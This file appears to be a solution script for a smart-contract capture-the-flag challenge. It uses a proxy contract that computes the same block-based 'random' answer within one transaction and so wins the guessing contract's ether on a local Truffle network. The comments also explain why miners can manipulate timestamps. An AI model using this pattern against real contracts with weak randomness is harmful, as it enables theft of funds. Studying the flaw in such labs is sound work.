/**
 * INSTRUCTIONS
 *
 * 1. Start development network by running `truffle development`
 * 2. Copy mnemonic to the variable below and double-check localhost port is correct
 * 3. Run migration in development and re-execute all the steps: `truffle migrate --reset`
 * 4. Copy guess and proxy recently created contract addresses to the variables below
 * 5. All good, run this file.
 *
 * SOLUTION
 *
 * The answer is calculated at run time so unless we somehow know (see §note below) which block
 * will execute the `guess` function, then it's impossible to figure out the number. The plan here
 * is to cleate an exploit / proxy contract that will call the `guess` function. Because both 'win'
 * and `guess` function will be called virtually at the same time, the block will also be the same.
 *
 *
 * § If we mine the blocks ourself, we can inject transaction with a timestamp that we will use
 * in our current block header. This is related to miner front-running commonly found in
 * decentralized exchange implementation. That is, miner might have mis-aligned incentive when
 * transactions are public and the transaction has economic value. They can sway miners’ behaviors
 * away from fair incentive provided by gas collected in the block. Therefore it is almost never
 * a good idea to use block hash or timestamp as a source of randomness whether or not it could be
 * programmatically exploited or not.
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:9545",
});

const web3 = new Web3(provider);

const proxyAbi = JSON.parse(
  fs.readFileSync("./4_guess_the_new_number_local/build/contracts/ProxyContract.json")
).abi;

const guessAbi = JSON.parse(
  fs.readFileSync(
    "./4_guess_the_new_number_local/build/contracts/GuessTheNewNumberChallenge.json"
  )
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const guessContractAddress = "0xC431025c583627DA8626778c7AA2e131Aac82689";
const proxyContractAddress = "0x3B9e5E7543EdA9fBd30558E384Aad1c369276468";

const outputBalances = (userAccount) => {
  web3.eth.getBalance(userAccount, (_, balance) => {
    console.log("Account balance: " + Web3Utils.fromWei(balance, "ether"));
  });
  web3.eth.getBalance(guessContractAddress, (_, balance) => {
    console.log(
      "GuessContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
  web3.eth.getBalance(proxyContractAddress, (_, balance) => {
    console.log(
      "ProxyContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
};

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const amountToSend = Web3Utils.toWei("1", "ether");

    outputBalances(accounts[0]);

    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);
    proxyContract.methods
      .win(guessContractAddress)
      .send({ from: accounts[0], value: amountToSend })
      .then((res) => {
        console.log(res);

        // just curious about what the answer was
        proxyContract.methods
          .getLastAnswer()
          .call()
          .then((answer) => console.log("Answer: " + answer));

        const guessContract = new web3.eth.Contract(
          guessAbi,
          guessContractAddress
        );
        // did guess contract consider the answer correct?
        guessContract.methods
          .isComplete()
          .call()
          .then((res) => console.log("Is complete: " + res));

        // return ether expenses to original account
        proxyContract.methods
          .destroy()
          .send({ from: accounts[0] })
          .then(() => {
            outputBalances(accounts[0]);
          });
      });
  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
